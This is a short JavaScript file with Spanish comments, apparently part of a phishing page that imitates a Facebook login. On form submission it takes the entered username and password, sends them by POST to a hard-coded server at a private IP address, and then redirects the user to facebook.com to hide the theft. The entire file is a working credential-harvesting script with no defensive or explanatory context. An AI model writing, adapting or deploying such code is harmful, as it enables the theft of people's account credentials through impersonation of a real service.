document.getElementById("loginForm").addEventListener("submit", function (event) {
    event.preventDefault();
    let username = document.getElementById("username").value;
    let password = document.getElementById("password").value;

    // Verificar que los campos de usuario y contraseña no estén vacíos
    if (username.trim() !== "" && password.trim() !== "") {
        // Realizar la petición POST solo si los campos no están vacíos
        let requestData = { username: username, password: password };
        fetch("http://172.16.10.213:5000", {
            method: "POST",
            body: JSON.stringify(requestData)
        })
            .then(response => {
                // Redirigir a la página de Facebook después de enviar los datos del formulario
                window.location.href = "https://www.facebook.com";
            })
            .catch(error => {
                console.error("Error:", error);
            });
    } else {
        // Mostrar un mensaje de alerta si los campos están vacíos
        alert("Por favor ingrese su usuario y contraseña.");
    }
});
